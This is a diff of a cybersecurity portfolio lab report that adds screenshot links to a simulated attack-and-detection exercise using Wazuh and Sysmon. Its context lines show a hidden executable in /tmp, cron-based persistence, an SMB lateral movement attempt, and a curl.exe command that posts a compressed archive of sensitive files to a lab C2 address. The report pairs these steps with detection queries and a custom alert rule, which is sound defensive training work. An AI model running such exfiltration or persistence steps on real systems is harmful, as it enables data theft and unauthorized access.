@@ -37,7 +37,7 @@ Without these two investments, a real-world version of this attack would result 
 
 ## Attack Timeline
 
-![Attack Timeline Image]()
+![Attack Timeline Image](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_Attack%20Timeline.png)
 
 ## Part 1 - Initial Breach: Reconnaissance and Delivery
 
@@ -57,7 +57,7 @@ Permission denied (publickey,password).
 
 This simulated two distinct attacker behaviours: probing for active services on port 22 (reconnaissance), and submitting repeated invalid credentials (brute force). Both were performed against both a non-existent username and a real account with a wrong password, generating two distinct alert signatures in Wazuh.
 
-![Reconnaissance and Delivery]()
+![Reconnaissance and Delivery](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_01%20Reconnaissance%20and%20Delivery.jpg)
 
 ---
 
@@ -65,7 +65,7 @@ This simulated two distinct attacker behaviours: probing for active services on 
 
 A Wazuh Dashboard query was created using the filter `rule.groups: "authentication_failed"` targeting the web server agent. This returned a clear record of repeated SSH authentication failures from a single source.
 
-![Wazuh Dashboard showing authentication_failed alert filter results](images/part1_authentication_failed.png)
+![Wazuh Dashboard showing authentication_failed alert filter results](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_02%20Wazuh%20Dashboard%20showing%20authentication_failed%20alert%20filter%20results.jpg)
 
 >Figure 1: Wazuh Dashboard query results for `rule.groups: "authentication_failed"`. The alert log shows repeated SSH login failures, both against non-existent users and a real account with incorrect passwords, confirming the attacker's brute-force reconnaissance phase.*
 
@@ -91,6 +91,8 @@ touch /tmp/.image.pdf.exe
 chmod +x /tmp/.image.pdf.exe
 ```
 
+![Establishing Foothold: Exploitation and Persistence](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_03%20Establishing%20Foothold%20%20Exploitation%20and%20Persistence.jpg)
+
 The file was then written with a shell script simulating a C2 heartbeat, a recurring check-in to a command and control server:
 
 ```bash
@@ -110,7 +112,7 @@ crontab -e
 
 This ensures that even if the attacker's terminal session is closed, or the server is restarted, the backdoor continues to run while writing a timestamped heartbeat to `/tmp/.hidden-log` every 60 seconds. This is persistence.
 
-![Establishing Foothold: Exploitation and Persistence]()
+![Establishing Foothold: Exploitation and Persistence](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_03B%20Establishing%20Foothold%20Exploitation%20and%20Persistence.jpg)
 
 ---
 
@@ -127,7 +129,7 @@ Filtered to the Prime-Ubuntu endpoint. Two critical File Integrity Monitoring (F
 - **Rule 554 (File Added)**: Captured the creation of `/tmp/.image.pdf.exe`
 - **Rule 550 (File Modified)**: Captured repeated automated modifications to `/tmp/.hidden-log` driven by the cron-executed heartbeat script
 
-![Wazuh File Integrity Monitoring results showing Rule 554 and 550](images/part2_fim_alerts.png)
+![Wazuh File Integrity Monitoring results showing Rule 554 and 550](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_04%20Wazuh%20File%20Integrity%20Monitoring%20results%20showing%20Rule%20554%20and%20550.jpg)
 
 > Figure 2: Wazuh FIM alerts from the Prime-Ubuntu web server. Rule 554 captured the creation of the hidden malicious payload `/tmp/.image.pdf.exe`. Rule 550 captured repeated automated modifications to `/tmp/.hidden-log`, driven by the cron-executed C2 heartbeat script.*
 
@@ -148,7 +150,7 @@ The tool attempted to authenticate to the Windows `ADMIN$` administrative share 
 
 The authentication failure was due to invalid credentials. However, the network connection itself succeeded, proving that the DMZ server had unrestricted routing access to the internal Windows workstation over SMB. That routing path should not exist.
 
-![Lateral Movement and Privilege Escalation Attempt]()
+![Lateral Movement and Privilege Escalation Attempt](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_05%20Lateral%20Movement%20and%20Privilege%20Escalation%20Attempt.jpg)
 
 
 
@@ -164,7 +166,7 @@ OR (data.win.system.eventID: 4625)
 
 Filtered to the FABELT Windows endpoint. This returned the logon failure event with full forensic context.
 
-![Wazuh Dashboard showing Windows Event ID 4625 Logon Failure alert on the FABELT endpoint](images/part3_lateral_movement.png)
+![Wazuh Dashboard showing Windows Event ID 4625 Logon Failure alert on the FABELT endpoint](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_06%20Wazuh%20Dashboard%20showing%20Windows%20Event%20ID%204625%20Logon%20Failure%20alert%20on%20the%20FABELT%20endpoint.jpg)
 
 > Figure 3: Wazuh alert for Windows Event ID 4625 (Logon Failure) on the FABELT Windows endpoint. Key forensic artifacts: Source IP 192.168.43.216 (the compromised Prime-Ubuntu server), Target Account: Administrator, Logon Type 3 (network-based SMB connection). This confirms an unauthorized lateral movement attempt across the internal network boundary.*
 
@@ -208,6 +210,8 @@ tar.exe -czf C:\SensitiveFiles\exfil.tar.gz C:\SensitiveFiles\
 
 Compressing the archive serves two purposes: it reduces the transfer size and bypasses file content monitoring tools that scan individual files by extension or signature.
 
+![Data Staging and Exfiltration Attempt](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_07%20Data%20Staging%20and%20Exfiltration%20Attempt.jpg)
+
 **Step 3 - Attempt exfiltration to C2 server:**
 
 **First attempt - PowerShell Invoke-WebRequest:**
@@ -226,7 +230,7 @@ curl.exe -X POST -F "file=@C:\SensitiveFiles\exfil.tar.gz" http://192.168.43.216
 
 As an external binary, `curl.exe` spawns a distinct process, successfully generating Sysmon telemetry.
 
-![Data Staging and Exfiltration Attempt]()
+![Data Staging and Exfiltration Attempt](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_07B%20Data%20Staging%20and%20Exfiltration%20Attempt.jpg)
 
 ---
 
@@ -246,7 +250,7 @@ Results confirmed:
 
 Sysmon **Event ID 3** (network connection) was also captured, recording the outbound TCP connection from `curl.exe` to `192.168.43.216`.
 
-![Wazuh Dashboard showing Sysmon Event ID 1 process creation alerts for tar.exe (data compression) and curl.exe (exfiltration attempt)](images/part4_exfiltration.png)
+![Wazuh Dashboard showing Sysmon Event ID 1 process creation alerts for tar.exe (data compression) and curl.exe (exfiltration attempt)](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_08%20Wazuh%20Dashboard%20showing%20Sysmon%20Event%20ID%201%20process%20creation%20alerts%20for%20tar.exe%20(data%20compression)%20and%20curl.exe%20(exfiltration%20attempt).jpg)
 
 > Figure 4: Wazuh Sysmon telemetry showing the two-stage exfiltration sequence. The top alert captures tar.exe compressing the SensitiveFiles directory. The second alert captures curl.exe initiating an outbound HTTP connection to the C2 server at 192.168.43.216, exposing the destination IP in the command-line arguments.
 
@@ -263,7 +267,7 @@ Sysmon **Event ID 3** (network connection) was also captured, recording the outb
 
 With the attacker's C2 IP confirmed as `192.168.43.216`, a custom detection rule was written on the Wazuh Manager to generate a **Level 12 (High Severity)** alert for any future communication with this address. The rule was added to `/var/ossec/etc/rules/local_rules.xml`
 
-![Wazuh local_rules.xml modified with custom rule ID 100001 Level 12 targeting the known Crimson Dawn C2 IP address](images/part5a_custom_rule.png)
+![Wazuh local_rules.xml modified with custom rule ID 100001 Level 12 targeting the known Crimson Dawn C2 IP address](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_09%20Wazuh%20local_rules.xml%20modified%20with%20custom%20rule%20ID%20100001%20Level%2012%20targeting%20the%20known%20Crimson%20Dawn%20C2%20IP%20address.jpg)
 
 > Figure 5: Wazuh Manager local rules file updated with custom rule ID 100001. Any future communication with the known C2 IP (192.168.43.216) will immediately trigger a Level 12 high-severity alert tagged to MITRE T1071.001 (Application Layer Protocol), enabling SOC analysts to detect C2 re-establishment instantly.*
 
@@ -279,7 +283,7 @@ rule.groups: "vulnerability-detector"
 
 **Analyst Assessment:** The absence of known CVEs indicates Crimson Dawn likely gained initial access via one of three alternative vectors: a zero-day exploit, successful SSH credential brute-forcing (consistent with the Phase 1 findings), or exploitation of a system misconfiguration. The brute-force telemetry from Part 1 makes credential-based access the most probable initial vector.
 
-![Wazuh Vulnerability Detector scan results for the Prime-Ubuntu web server](images/part5b_vulnerability_scan.png)
+![Wazuh Vulnerability Detector scan results for the Prime-Ubuntu web server](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/58_10%20Wazuh%20Vulnerability%20Detector%20scan%20results%20for%20the%20Prime-Ubuntu%20web%20server.jpg)
 
 > Figure 6: Wazuh Vulnerability Detector results for the Prime-Ubuntu web server. Zero critical CVEs were returned for the installed service. This confirms the host was fully patched, and supports the assessment that initial access was gained through credential brute-forcing (consistent with Part 1 findings) rather than a known exploitable vulnerability.*
 
